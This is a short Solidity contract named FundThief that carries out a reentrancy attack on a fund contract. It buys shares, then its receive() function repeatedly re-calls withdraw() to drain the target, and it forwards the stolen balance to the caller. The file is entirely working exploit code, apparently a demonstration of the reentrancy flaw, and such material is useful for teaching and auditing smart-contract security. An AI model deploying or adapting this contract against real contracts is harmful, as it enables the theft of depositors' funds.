pragma solidity ^0.8.20;

interface VulnerableFund {
    function withdraw() external;
    function buyShares() external payable;
}

contract FundThief {
    uint256 times;
    uint256 count;

    function steal(address from, uint256 _times) public payable {
        require(msg.value > 0 , "Must pay something");
        times = _times;
        count = 0;

        // Map to interface
        VulnerableFund fund = VulnerableFund(from);
        // Buy a single Eths worth of shares, by calling 'buyShares' and also giving 1 Ethereum
        fund.buyShares{value: msg.value}();
        // Withdraw the shares, which will lead to the 'recieve' function being called
        fund.withdraw();

        // Attack is done
        // Forward on the funds
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Cannot forward Funds");
    }

    receive() external payable {
        count += 1;
        if (count >= times) { return; }
        VulnerableFund(msg.sender).withdraw();
    }
}